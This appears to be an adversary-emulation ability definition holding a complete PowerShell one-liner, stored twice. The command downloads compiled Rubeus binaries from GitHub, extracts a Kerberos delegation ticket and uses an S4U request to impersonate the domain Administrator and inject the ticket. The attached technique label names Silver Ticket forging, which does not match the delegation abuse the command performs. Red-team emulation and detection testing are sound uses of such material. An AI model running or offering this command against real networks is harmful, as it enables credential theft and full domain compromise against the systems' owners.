command: cd C:\Scripts;mkdir tools;cd tools;wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/archive/refs/heads/master.zip -o Rubeus.zip;Expand-Archive .\Rubeus.zip;Rubeus\Ghostpack-CompiledBinaries-master\Rubeus.exe tgtdeleg /nowrap > ticket.txt;$filePath = "C:\Scripts\tools\ticket.txt";$base64Ticket = ($fileContent = Get-Content -Path $filePath) -join "`n" -replace "(?s).*?\[\*\] base64\(ticket\.kirbi\):\s*|\s*$"; Set-Content -Path "C:\Scripts\tools\ticket.base64" -Value $base64Ticket;Rubeus\Ghostpack-CompiledBinaries-master\Rubeus.exe s4u /ticket:$base64Ticket /impersonateuser:Administrator /msdsspn:HTTP/service.it.lmt.com /ptt;
plaintext_command: cd C:\Scripts;mkdir tools;cd tools;wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/archive/refs/heads/master.zip -o Rubeus.zip;Expand-Archive .\Rubeus.zip;Rubeus\Ghostpack-CompiledBinaries-master\Rubeus.exe tgtdeleg /nowrap > ticket.txt;$filePath = "C:\Scripts\tools\ticket.txt";$base64Ticket = ($fileContent = Get-Content -Path $filePath) -join "`n" -replace "(?s).*?\[\*\] base64\(ticket\.kirbi\):\s*|\s*$"; Set-Content -Path "C:\Scripts\tools\ticket.base64" -Value $base64Ticket;Rubeus\Ghostpack-CompiledBinaries-master\Rubeus.exe s4u /ticket:$base64Ticket /impersonateuser:Administrator /msdsspn:HTTP/service.it.lmt.com /ptt;

ability_metadata.ability_description: will use the delegation attac to impersonate the admin, beginning by extracting the kirbi ticket from rubeus

attack_metadata.technique_name: Steal or Forge Kerberos Tickets: Silver Ticket
